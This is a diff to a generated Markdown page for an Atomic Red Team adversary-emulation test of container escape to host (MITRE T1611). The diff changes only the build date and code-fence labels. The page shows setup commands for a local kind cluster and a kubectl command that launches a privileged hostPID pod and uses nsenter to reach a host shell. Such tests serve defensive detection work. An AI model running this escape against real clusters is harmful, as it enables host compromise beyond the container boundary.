@@ -6,7 +6,7 @@ generated: "true"
 attack_technique_id: "T1611"
 attack_technique_name: "Escape to Host"
 source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1611/T1611.yaml"
-build_date: "2026-04-26 14:38:40"
+build_date: "2026-04-26 17:02:13"
 executor: "sh"
 aliases:
   - "0b2f9520-a17a-4671-9dba-3bd034099fff"
@@ -47,13 +47,13 @@ Verify docker is installed.
 
 ### Prerequisite Check
 
-```text
+```bash
 which docker
 ```
 
 ### Get Prerequisite
 
-```text
+```bash
 if [ "" == "`which docker`" ]; then echo "Docker Not Found"; if [ -n "`which apt-get`" ]; then sudo apt-get -y install docker ; elif [ -n "`which yum`" ]; then sudo yum -y install docker ; fi ; else echo "Docker installed"; fi
 ```
 
@@ -61,13 +61,13 @@ Verify docker service is running.
 
 ### Prerequisite Check
 
-```text
+```bash
 sudo systemctl status docker
 ```
 
 ### Get Prerequisite
 
-```text
+```bash
 sudo systemctl start docker
 ```
 
@@ -75,13 +75,13 @@ Verify kind is in the path.
 
 ### Prerequisite Check
 
-```text
+```bash
 which kind
 ```
 
 ### Get Prerequisite
 
-```text
+```bash
 curl -Lo ./kind https://kind.sigs.k8s.io/dl/v0.10.0/kind-linux-amd64
 chmod +x ./kind
 mv kind /usr/bin/kind
@@ -91,13 +91,13 @@ Verify kind-atomic-cluster is created
 
 ### Prerequisite Check
 
-```text
+```bash
 sudo kind get clusters
 ```
 
 ### Get Prerequisite
 
-```text
+```bash
 sudo kind create cluster --name atomic-cluster
 ```
 
@@ -105,13 +105,13 @@ Verify kubectl is in path
 
 ### Prerequisite Check
 
-```text
+```bash
 which kubectl
 ```
 
 ### Get Prerequisite
 
-```text
+```bash
 curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
 chmod +x ./kubectl
 mv kubectl /usr/bin/kubectl
@@ -123,13 +123,13 @@ mv kubectl /usr/bin/kubectl
 
 ### Command
 
-```sh
+```bash
 kubectl --context kind-atomic-cluster run atomic-nsenter-escape-pod --restart=Never -ti --rm --image alpine --overrides '{"spec":{"hostPID": true, "containers":[{"name":"1","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin": true,"tty":true,"securityContext":{"privileged":true}}]}}'
 ```
 
 ### Cleanup
 
-```sh
+```bash
 kubectl --context kind-atomic-cluster delete pod atomic-escape-pod
 ```
 
